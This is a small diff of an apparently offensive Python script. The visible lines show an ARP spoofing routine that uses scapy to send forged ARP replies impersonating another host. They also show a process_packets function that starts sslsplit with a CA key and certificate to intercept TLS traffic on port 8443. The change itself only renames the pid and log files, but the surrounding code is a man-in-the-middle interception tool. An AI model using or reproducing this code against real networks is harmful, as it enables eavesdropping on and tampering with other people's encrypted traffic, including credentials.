@@ -61,7 +61,7 @@ def ARP_spoofing():
             arp = scapy.ARP(op=2, pdst=IP, hwdst=MAC, psrc=other_IP, hwsrc=my_MAC)
             scapy.send(arp, verbose=False) # verbose=False -> disable packet sent notification
 def process_packets():
-    Popen(["sslsplit", "-D", '-p', 'ssl.pid', "-S", "ssl_log", 
+    Popen(["sslsplit", "-D", '-p', 'sslsplit.pid', "-S", "sslsplit_log", 
            "-k", "ca.key", "-c", "ca.crt",            
            "ssl", "0.0.0.0", "8443"],
            stdout=DEVNULL, stderr=DEVNULL)
